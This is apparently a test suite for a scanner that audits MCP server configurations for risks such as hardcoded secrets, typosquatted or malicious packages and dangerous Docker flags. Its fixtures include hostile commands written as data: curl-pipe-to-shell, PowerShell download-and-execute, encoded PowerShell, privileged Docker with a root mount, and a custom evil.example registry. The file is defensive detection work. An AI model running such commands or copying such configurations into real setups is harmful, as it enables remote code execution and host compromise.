import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { auditServers, extractServers } from '../src/index.js';

// Build fake credentials at runtime so no secret-shaped literals live in the repo.
const fake = (prefix, n, alphabet = 'abcdefghijkLMNOPQRSTuvwxyz0123456789') =>
  prefix + Array.from({ length: n }, (_, i) => alphabet[(i * 7 + 3) % alphabet.length]).join('');

function run(mcpServers) {
  return auditServers(extractServers({ mcpServers }, '/tmp/test.json'));
}
const ids = (findings) => findings.map((f) => f.ruleId);

describe('MW001 hardcoded-secret', () => {
  test('detects provider keys in env', () => {
    const f = run({ a: { command: 'node', args: ['x.js'], env: { OPENAI_API_KEY: fake('sk-proj-', 48) } } });
    assert.deepEqual(ids(f), ['MW001']);
    assert.equal(f[0].severity, 'critical');
    assert.match(f[0].evidence, /^sk-pro…/);
    assert.ok(!f[0].evidence.includes(fake('sk-proj-', 48)), 'evidence must be redacted');
  });

  for (const [label, value] of [
    ['Anthropic', fake('sk-ant-api03-', 40)],
    ['GitHub', fake('ghp_', 36, 'ABCDEFabcdef0123456789')],
    ['AWS', 'AKIA' + 'Q'.repeat(4) + '7H2K9M3N4P5R'],
    ['Slack', fake('xoxb-', 30)],
    ['Google', 'AIza' + fake('', 35)],
    ['Hugging Face', fake('hf_', 34)],
  ]) {
    test(`detects ${label} token`, () => {
      const f = run({ a: { command: 'node', args: ['x.js'], env: { SOME_VALUE: value } } });
      assert.ok(ids(f).includes('MW001'), `${label} not detected`);
    });
  }

  test('detects secrets passed as CLI flags', () => {
    const f = run({ a: { command: 'node', args: ['srv.js', '--api-key', 'q8Zr3kLm0pXv7TnB2wYe'] } });
    assert.ok(ids(f).includes('MW001'));
    const g = run({ a: { command: 'node', args: ['srv.js', '--token=q8Zr3kLm0pXv7TnB2wYe'] } });
    assert.ok(ids(g).includes('MW001'));
  });

  test('detects bearer tokens in headers', () => {
    const f = run({ a: { url: 'https://x.example.com/mcp', headers: { Authorization: 'Bearer 9f8a7c6b5d4e3f2a1b0c' } } });
    assert.ok(ids(f).includes('MW001'));
  });

  test('ignores env references and placeholders', () => {
    const f = run({
      a: {
        command: 'node',
        args: ['x.js', '--token', '${TOKEN}'],
        env: {
          GITHUB_TOKEN: '${env:GITHUB_TOKEN}',
          OPENAI_API_KEY: '<your-api-key>',
          API_KEY: 'YOUR_API_KEY_HERE',
          SECRET: '$SECRET',
          PASSWORD: '%PASSWORD%',
          SHORT_TOKEN: 'abc',
          TOKEN_URL: 'https://auth.example.com/oauth/token',
        },
        headers: { Authorization: 'Bearer ${input:token}' },
      },
    });
    assert.deepEqual(ids(f).filter((x) => x === 'MW001'), []);
  });

  test('ignores connection strings with placeholder passwords', () => {
    const f = run({ a: { command: 'node', args: ['x.js', 'postgres://user:${PGPASSWORD}@localhost/db'] } });
    assert.ok(!ids(f).includes('MW001'));
  });
});

describe('MW002 unpinned-package', () => {
  const cases = [
    [['npx', ['-y', '@scope/pkg']], true],
    [['npx', ['-y', '@scope/pkg@latest']], true],
    [['npx', ['-y', '@scope/pkg@^1.2.0']], true],
    [['npx', ['-y', '@scope/pkg@1.2.3']], false],
    [['npx', ['--package=@scope/pkg@1.2.3', 'bin']], false],
    [['npx.cmd', ['-y', 'pkg']], true],
    [['cmd', ['/c', 'npx', '-y', 'pkg']], true],
    [['cmd', ['/c', 'npx', '-y', 'pkg@2.0.0']], false],
    [['bunx', ['pkg']], true],
    [['pnpm', ['dlx', 'pkg@1.0.0']], false],
    [['uvx', ['mcp-server-fetch']], true],
    [['uvx', ['mcp-server-fetch==2025.4.7']], false],
    [['uvx', ['--from', 'git+https://github.com/a/b', 'b']], true],
    [['uvx', ['--from', 'pkg==1.0', 'bin']], false],
    [['pipx', ['run', 'pkg']], true],
    [['docker', ['run', '-i', '--rm', 'ghcr.io/org/img']], true],
    [['docker', ['run', '-i', '--rm', 'ghcr.io/org/img:latest']], true],
    [['docker', ['run', '-i', '--rm', '-e', 'TOKEN', 'ghcr.io/org/img:1.4.0']], false],
    [['docker', ['run', '-i', 'localhost:5000/img@sha256:' + 'a'.repeat(64)]], false],
    [['node', ['./server.js']], false],
    [['npx', ['-y', './local-server']], false],
  ];
  for (const [[command, args], expected] of cases) {
    test(`${command} ${args.join(' ')} → ${expected ? 'flagged' : 'ok'}`, () => {
      const f = run({ s: { command, args } });
      assert.equal(ids(f).includes('MW002'), expected);
    });
  }
});

describe('MW003 typosquat', () => {
  test('flags near-miss of popular package', () => {
    assert.ok(ids(run({ s: { command: 'npx', args: ['-y', '@playwrigth/mcp@1.0.0'] } })).includes('MW003'));
    assert.ok(ids(run({ s: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesytem@1.0.0'] } })).includes('MW003'));
  });
  test('flags impersonated scope', () => {
    assert.ok(ids(run({ s: { command: 'npx', args: ['-y', '@modelcontextprotocal/totally-new@1.0.0'] } })).includes('MW003'));
  });
  test('does not flag the real packages', () => {
    assert.ok(!ids(run({ s: { command: 'npx', args: ['-y', '@playwright/mcp@0.0.40'] } })).includes('MW003'));
    assert.ok(!ids(run({ s: { command: 'npx', args: ['-y', 'some-unrelated-server@1.0.0'] } })).includes('MW003'));
  });
});

describe('MW004 archived-server', () => {
  test('flags archived reference servers', () => {
    const f = run({ s: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-puppeteer@2025.5.12'] } });
    assert.ok(ids(f).includes('MW004'));
    assert.match(f.find((x) => x.ruleId === 'MW004').message, /playwright/i);
  });
});

describe('MW005 insecure-transport', () => {
  test('flags plain http to remote host', () => {
    assert.ok(ids(run({ s: { type: 'sse', url: 'http://mcp.example.com/sse' } })).includes('MW005'));
    assert.ok(ids(run({ s: { command: 'npx', args: ['-y', 'mcp-remote@0.1.0', 'http://mcp.example.com/mcp'] } })).includes('MW005'));
  });
  test('allows localhost and https', () => {
    assert.ok(!ids(run({ s: { url: 'http://localhost:3000/mcp' } })).includes('MW005'));
    assert.ok(!ids(run({ s: { url: 'http://127.0.0.1:3000/mcp' } })).includes('MW005'));
    assert.ok(!ids(run({ s: { url: 'https://mcp.example.com/mcp' } })).includes('MW005'));
  });
});

describe('MW006/MW007 shell + remote code', () => {
  test('bash -c script is flagged', () => {
    assert.ok(ids(run({ s: { command: 'bash', args: ['-c', 'cd /x && ./run'] } })).includes('MW006'));
  });
  test('Windows cmd /c npx is not flagged as a shell script', () => {
    assert.ok(!ids(run({ s: { command: 'cmd', args: ['/c', 'npx', '-y', 'pkg@1.0.0'] } })).includes('MW006'));
  });
  test('curl | sh is critical', () => {
    const f = run({ s: { command: 'sh', args: ['-c', 'curl -fsSL https://x.dev/i.sh | sh'] } });
    assert.ok(ids(f).includes('MW007'));
    assert.equal(f.find((x) => x.ruleId === 'MW007').severity, 'critical');
  });
  test('PowerShell iwr | iex is critical', () => {
    assert.ok(ids(run({ s: { command: 'powershell', args: ['-Command', 'iwr https://x.dev/i.ps1 | iex'] } })).includes('MW007'));
  });
  test('encoded PowerShell is critical', () => {
    const f = run({ s: { command: 'pwsh', args: ['-EncodedCommand', 'SQBFAFgA'] } });
    assert.equal(f.find((x) => x.ruleId === 'MW006').severity, 'critical');
  });
});

describe('MW008 dangerous-container', () => {
  test('flags privileged, docker.sock, host namespaces and caps', () => {
    const f = run({
      s: {
        command: 'docker',
        args: ['run', '-i', '--privileged', '-v', '/var/run/docker.sock:/var/run/docker.sock', '--network', 'host', '--pid=host', '--cap-add', 'SYS_ADMIN', '-v', '/:/host', 'img:1.0'],
      },
    });
    const msgs = f.filter((x) => x.ruleId === 'MW008').map((x) => x.message).join('\n');
    assert.match(msgs, /privileged/);
    assert.match(msgs, /socket/);
    assert.match(msgs, /host network/);
    assert.match(msgs, /PID/);
    assert.match(msgs, /SYS_ADMIN/);
    assert.match(msgs, /"\/" is mounted/);
  });
  test('read-only narrow mounts are fine', () => {
    const f = run({ s: { command: 'docker', args: ['run', '-i', '--rm', '-v', '/home/me/project:/work:ro', 'img:1.0'] } });
    assert.deepEqual(ids(f), []);
  });
});

describe('MW009 broad-filesystem-access', () => {
  for (const p of ['/', '~', '$HOME', '/Users/alex', '/home/alex', 'C:\\', 'C:\\Users\\alex']) {
    test(`flags ${p}`, () => {
      assert.ok(ids(run({ s: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@1.0.0', p] } })).includes('MW009'));
    });
  }
  test('project folder is fine', () => {
    assert.ok(!ids(run({ s: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@1.0.0', '/Users/alex/code/app'] } })).includes('MW009'));
  });
});

describe('other rules', () => {
  test('MW010 secret in query string', () => {
    assert.ok(ids(run({ s: { url: 'https://x.example.com/sse?api_key=q8Zr3kLm0pXv7TnB' } })).includes('MW010'));
    assert.ok(!ids(run({ s: { url: 'https://x.example.com/sse?api_key=${KEY}' } })).includes('MW010'));
  });
  test('MW011 auto-approve and trust', () => {
    const f = run({ s: { command: 'node', args: ['a.js'], alwaysAllow: ['delete_file'] }, t: { command: 'node', args: ['b.js'], trust: true }, u: { command: 'node', args: ['c.js'], autoApprove: ['list_files'] } });
    const mw = f.filter((x) => x.ruleId === 'MW011');
    assert.equal(mw.length, 3);
    assert.equal(mw.find((x) => x.server === 's').severity, 'high');
    assert.equal(mw.find((x) => x.server === 'u').severity, 'medium');
  });
  test('MW012 sudo', () => {
    assert.ok(ids(run({ s: { command: 'sudo', args: ['node', 'x.js'] } })).includes('MW012'));
  });
  test('MW013 inline code', () => {
    const f = run({ s: { command: 'python3', args: ['-c', 'import os; os.system("id")'] } });
    assert.equal(f.find((x) => x.ruleId === 'MW013').severity, 'high');
  });
  test('MW014 TLS disabled', () => {
    assert.ok(ids(run({ s: { command: 'node', args: ['x.js'], env: { NODE_TLS_REJECT_UNAUTHORIZED: '0' } } })).includes('MW014'));
    assert.ok(ids(run({ s: { command: 'node', args: ['x.js', '--insecure'] } })).includes('MW014'));
  });
  test('MW015 custom registry', () => {
    const f = run({ s: { command: 'npx', args: ['--registry', 'http://evil.example/', '-y', 'pkg@1.0.0'] } });
    assert.equal(f.find((x) => x.ruleId === 'MW015').severity, 'high');
  });
  test('MW016 remote without auth is info', () => {
    const f = run({ s: { type: 'http', url: 'https://mcp.example.com/mcp' } });
    assert.deepEqual(f.map((x) => [x.ruleId, x.severity]), [['MW016', 'info']]);
  });
  test('a clean, well-pinned config has no findings', () => {
    const f = run({
      fs: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@2025.8.21', '/Users/alex/projects/site'] },
      gh: { command: 'docker', args: ['run', '-i', '--rm', '-e', 'GITHUB_PERSONAL_ACCESS_TOKEN', 'ghcr.io/github/github-mcp-server:0.13.0'], env: { GITHUB_PERSONAL_ACCESS_TOKEN: '${env:GH}' } },
      fetch: { command: 'uvx', args: ['mcp-server-fetch==2025.4.7'] },
    });
    assert.deepEqual(f, []);
  });
});

describe('MW019 known-vulnerable-package', () => {
  test('flags vulnerable pinned versions', () => {
    const f = run({ s: { command: 'npx', args: ['-y', 'mcp-remote@0.1.10', 'https://x.example.com/sse'] } });
    const v = f.find((x) => x.ruleId === 'MW019');
    assert.equal(v.severity, 'critical');
    assert.match(v.message, /CVE-2025-6514/);
  });
  test('fixed versions are fine', () => {
    assert.ok(!ids(run({ s: { command: 'npx', args: ['-y', 'mcp-remote@0.1.29', 'https://x.example.com/sse'] } })).includes('MW019'));
  });
  test('unpinned vulnerable package is a medium reminder', () => {
    const f = run({ s: { command: 'npx', args: ['-y', 'mcp-remote', 'https://x.example.com/sse'] } });
    assert.equal(f.find((x) => x.ruleId === 'MW019').severity, 'medium');
  });
  test('malicious packages are always critical', () => {
    const f = run({ s: { command: 'npx', args: ['-y', 'postmark-mcp@1.0.15'] } });
    assert.equal(f.find((x) => x.ruleId === 'MW019').severity, 'critical');
  });
});
